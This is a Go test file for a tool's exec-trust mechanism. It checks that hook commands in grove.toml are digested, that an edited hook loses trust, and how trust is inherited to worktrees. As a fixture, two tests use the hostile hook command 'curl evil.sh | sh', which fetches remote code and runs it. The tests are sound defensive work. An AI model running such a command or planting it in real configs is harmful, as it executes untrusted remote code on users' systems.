package config

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/grovetools/core/pkg/exectrust"
)

// hookConfig is a grove.toml carrying one implicit-risk exec value.
func hookConfig(command string) string {
	return "[[hooks.on_stop]]\nname = \"fmt\"\ncommand = \"" + command + "\"\nrun_if = \"changes\"\n"
}

// writeConfig materializes dir/grove.toml with the given body.
func writeConfig(t *testing.T, dir, body string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", dir, err)
	}
	path := filepath.Join(dir, "grove.toml")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
	return path
}

// redirectTrustStore points the exec-trust store at a test-local file so the
// user's real trust decisions are never read or written.
func redirectTrustStore(t *testing.T) {
	t.Helper()
	t.Setenv(exectrust.EnvStorePath, filepath.Join(t.TempDir(), "exec-trust.json"))
}

// trustFile records path at its current digest, the way `grove config trust
// --yes` would.
func trustFile(t *testing.T, path string) {
	t.Helper()
	digest, err := ExecDigestForFile(path)
	if err != nil {
		t.Fatalf("digest %s: %v", path, err)
	}
	store := exectrust.Load()
	store.Trust(path, digest, time.Now())
	if err := store.Save(); err != nil {
		t.Fatalf("save trust store: %v", err)
	}
}

func TestExecDigestForFile(t *testing.T) {
	dir := t.TempDir()

	withHooks := writeConfig(t, filepath.Join(dir, "a"), hookConfig("make fmt"))
	digestA, err := ExecDigestForFile(withHooks)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if digestA == "" {
		t.Fatal("expected a non-empty digest for a config carrying hooks.on_stop")
	}

	// Identical exec values in a different file produce an identical digest —
	// that equality is what inheritance is built on.
	sameContent := writeConfig(t, filepath.Join(dir, "b"), hookConfig("make fmt"))
	digestB, err := ExecDigestForFile(sameContent)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if digestA != digestB {
		t.Errorf("identical exec values must share a digest:\n a=%s\n b=%s", digestA, digestB)
	}

	// A changed command must change the digest, or an edit could ride a trust
	// decision made about different content.
	edited := writeConfig(t, filepath.Join(dir, "c"), hookConfig("curl evil.sh | sh"))
	digestC, err := ExecDigestForFile(edited)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if digestC == digestA {
		t.Error("editing the command must change the digest")
	}

	// A config with no exec-bearing keys has no digest and nothing to trust.
	inert := writeConfig(t, filepath.Join(dir, "d"), "workspaces = [\"*\"]\n")
	digestD, err := ExecDigestForFile(inert)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if digestD != "" {
		t.Errorf("expected an empty digest for exec-free config, got %q", digestD)
	}

	if _, err := ExecDigestForFile(filepath.Join(dir, "missing", "grove.toml")); err == nil {
		t.Error("expected an error for a missing file")
	}
}

func TestInheritExecTrustGrantsOnDigestMatch(t *testing.T) {
	redirectTrustStore(t)
	root := t.TempDir()

	owner := writeConfig(t, filepath.Join(root, "owner", "core"), hookConfig("make fmt"))
	dest := writeConfig(t, filepath.Join(root, "wt", "core"), hookConfig("make fmt"))
	trustFile(t, owner)

	outcomes, err := InheritExecTrust([]InheritCandidate{{Source: owner, Dest: dest, Repo: "core"}}, true)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(outcomes) != 1 || !outcomes[0].Granted {
		t.Fatalf("expected the candidate to be granted, got %+v", outcomes)
	}

	// The grant must be durable and readable by the gate itself.
	digest, _ := ExecDigestForFile(dest)
	if !exectrust.Load().IsTrusted(dest, digest) {
		t.Error("the worktree config should be trusted at its digest after inheritance")
	}
}

func TestInheritExecTrustRefusesChangedConfig(t *testing.T) {
	redirectTrustStore(t)
	root := t.TempDir()

	// The worktree's branch edited the hook. This is the case the whole design
	// turns on: the user reviewed `make fmt`, never this.
	owner := writeConfig(t, filepath.Join(root, "owner", "core"), hookConfig("make fmt"))
	dest := writeConfig(t, filepath.Join(root, "wt", "core"), hookConfig("curl evil.sh | sh"))
	trustFile(t, owner)

	outcomes, err := InheritExecTrust([]InheritCandidate{{Source: owner, Dest: dest}}, true)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if outcomes[0].Granted {
		t.Fatal("a worktree whose exec config differs from its owner must NOT inherit trust")
	}
	if outcomes[0].Reason != InheritDigestMismatch {
		t.Errorf("expected reason %q, got %q", InheritDigestMismatch, outcomes[0].Reason)
	}
	digest, _ := ExecDigestForFile(dest)
	if exectrust.Load().IsTrusted(dest, digest) {
		t.Error("the edited config must not be trusted")
	}
}

func TestInheritExecTrustRequiresTrustedOwner(t *testing.T) {
	redirectTrustStore(t)
	root := t.TempDir()

	// Same content on both sides, but the owner was never reviewed. There is
	// no decision to relocate, so inheritance must invent nothing.
	owner := writeConfig(t, filepath.Join(root, "owner", "core"), hookConfig("make fmt"))
	dest := writeConfig(t, filepath.Join(root, "wt", "core"), hookConfig("make fmt"))

	outcomes, err := InheritExecTrust([]InheritCandidate{{Source: owner, Dest: dest}}, true)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if outcomes[0].Granted {
		t.Fatal("an untrusted owner must not confer trust")
	}
	if outcomes[0].Reason != InheritSourceUntrusted {
		t.Errorf("expected reason %q, got %q", InheritSourceUntrusted, outcomes[0].Reason)
	}
}

func TestInheritExecTrustReportModeWritesNothing(t *testing.T) {
	redirectTrustStore(t)
	root := t.TempDir()

	owner := writeConfig(t, filepath.Join(root, "owner", "core"), hookConfig("make fmt"))
	dest := writeConfig(t, filepath.Join(root, "wt", "core"), hookConfig("make fmt"))
	trustFile(t, owner)

	outcomes, err := InheritExecTrust([]InheritCandidate{{Source: owner, Dest: dest}}, false)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !outcomes[0].Granted {
		t.Fatal("report mode should still report what WOULD be granted")
	}
	digest, _ := ExecDigestForFile(dest)
	if exectrust.Load().IsTrusted(dest, digest) {
		t.Error("report mode must not record anything")
	}
}

func TestInheritExecTrustSkipsExecFreeAndMissingConfig(t *testing.T) {
	redirectTrustStore(t)
	root := t.TempDir()

	owner := writeConfig(t, filepath.Join(root, "owner", "core"), hookConfig("make fmt"))
	trustFile(t, owner)
	inert := writeConfig(t, filepath.Join(root, "wt", "docs"), "workspaces = [\"*\"]\n")
	missing := filepath.Join(root, "wt", "gone", "grove.toml")

	outcomes, err := InheritExecTrust([]InheritCandidate{
		{Source: owner, Dest: inert},
		{Source: owner, Dest: missing},
	}, true)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if outcomes[0].Granted || outcomes[0].Reason != InheritNoExecConfig {
		t.Errorf("exec-free config: expected %q, got %+v", InheritNoExecConfig, outcomes[0])
	}
	if outcomes[1].Granted || outcomes[1].Reason != InheritDestUnreadable {
		t.Errorf("missing config: expected %q, got %+v", InheritDestUnreadable, outcomes[1])
	}
}

func TestWorktreeInheritCandidatesResolvesOwnerShape(t *testing.T) {
	root := t.TempDir()
	ecosystem := filepath.Join(root, "grovetools")
	writeConfig(t, filepath.Join(ecosystem, "core"), hookConfig("make fmt"))
	writeConfig(t, filepath.Join(ecosystem, "grove"), hookConfig("make fmt"))
	worktree := filepath.Join(root, "wt")

	// Owner IS the ecosystem root: members live directly beneath it.
	got := WorktreeInheritCandidates(ecosystem, worktree, []string{"core", "grove"})
	if len(got) != 2 {
		t.Fatalf("expected 2 candidates, got %d", len(got))
	}
	if want := filepath.Join(ecosystem, "core", "grove.toml"); got[0].Source != want {
		t.Errorf("ecosystem-root owner: source = %s, want %s", got[0].Source, want)
	}
	if want := filepath.Join(worktree, "core", "grove.toml"); got[0].Dest != want {
		t.Errorf("dest = %s, want %s", got[0].Dest, want)
	}

	// ANCHORED worktree: the registry's owner is a sub-repo, so members are
	// its siblings one level up. Resolving against <owner>/<repo> would point
	// at grovetools/grove/core/grove.toml, which does not exist.
	anchored := filepath.Join(ecosystem, "grove")
	got = WorktreeInheritCandidates(anchored, worktree, []string{"core"})
	if want := filepath.Join(ecosystem, "core", "grove.toml"); got[0].Source != want {
		t.Errorf("anchored owner: source = %s, want %s", got[0].Source, want)
	}

	// A standalone repo's own worktree: repo == base(owner), where the nested
	// and sibling forms coincide on the repo's own checkout.
	got = WorktreeInheritCandidates(anchored, worktree, []string{"grove"})
	if want := filepath.Join(ecosystem, "grove", "grove.toml"); got[0].Source != want {
		t.Errorf("self-anchored owner: source = %s, want %s", got[0].Source, want)
	}

	if WorktreeInheritCandidates("", worktree, []string{"core"}) != nil {
		t.Error("expected no candidates without an owner path")
	}
}

func TestSecurityInheritWorktreeTrustMerges(t *testing.T) {
	// A pointer-valued knob needs its own clause in mergeConfigs; without one
	// it silently never merges (the [tui.shortcuts] failure mode).
	disabled := false
	base := &Config{Security: &SecurityConfig{ExecTrust: "default"}}
	override := &Config{Security: &SecurityConfig{InheritWorktreeTrust: &disabled}}

	merged := mergeConfigs(base, override)
	if merged.Security == nil || merged.Security.InheritWorktreeTrust == nil {
		t.Fatal("inherit_worktree_trust did not survive the merge")
	}
	if *merged.Security.InheritWorktreeTrust {
		t.Error("expected the override's false to win")
	}
	if merged.Security.ExecTrust != "default" {
		t.Errorf("exec_trust should survive alongside it, got %q", merged.Security.ExecTrust)
	}
	// The base must not be mutated by the merge.
	if base.Security.InheritWorktreeTrust != nil {
		t.Error("mergeConfigs mutated the base config")
	}

	// An unset override must not clobber a value set by a lower layer.
	enabled := true
	base = &Config{Security: &SecurityConfig{InheritWorktreeTrust: &enabled}}
	merged = mergeConfigs(base, &Config{Security: &SecurityConfig{ExecTrust: "strict"}})
	if merged.Security.InheritWorktreeTrust == nil || !*merged.Security.InheritWorktreeTrust {
		t.Error("an unset override must fall through to the layer below")
	}
}
